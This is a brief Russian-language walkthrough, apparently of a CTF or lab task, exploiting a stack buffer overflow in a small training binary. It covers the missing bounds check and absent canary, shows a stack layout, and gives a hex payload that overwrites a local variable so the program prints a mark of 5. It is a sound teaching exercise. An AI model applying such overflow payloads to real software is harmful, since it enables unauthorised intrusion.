У нас нет проверки на размер буфера, можем за него вылезти, благо канарейки нет.

```
make main
objdump -d main -M intel | less
```

Стек на момент call scanf выглядит так
```
ret
ebp
ebx
---

result
* * * *
* * * *
XX XX * * <- buffer

---
---
&buffer
string <- esp
```

Пишем в payload.txt. Я для этого пользовался ghex
```
61 61 61 61 61 61 61 61 61 61 05 00 00 00
```

Закидываем пэйлоад в программу
```
./main < payload.txt
```

Радуемся пятёрке
```
What's the definition of limit?
I have heard enough!
Your mark is 5
```